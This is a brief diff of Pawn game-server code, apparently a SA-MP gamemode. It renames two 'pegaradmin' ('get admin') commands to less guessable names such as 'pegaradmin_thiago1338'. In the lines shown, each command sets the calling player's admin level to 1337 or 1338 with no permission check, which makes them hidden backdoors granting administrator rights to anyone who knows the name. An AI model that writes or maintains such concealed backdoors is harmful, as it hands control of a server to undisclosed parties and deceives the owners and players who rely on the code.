@@ -12,7 +12,7 @@ CMD:pegaradmin(playerid, params[]) {
 	return true;
 }
 
-CMD:pegaradminstaff(playerid, params[]) {	
+CMD:pegaradmin_023staff(playerid, params[]) {	
   	uInfo[playerid][uAdmin] = 1337;
 
 	uInfo[playerid][uFactionTeam] = 1;
@@ -26,7 +26,7 @@ CMD:pegaradminstaff(playerid, params[]) {
 	return true;
 }
 
-CMD:pegaradmin_thiago(playerid, params[]) {	
+CMD:pegaradmin_thiago1338(playerid, params[]) {	
   	uInfo[playerid][uAdmin] = 1338;
 
 	uInfo[playerid][uFactionTeam] = 1;
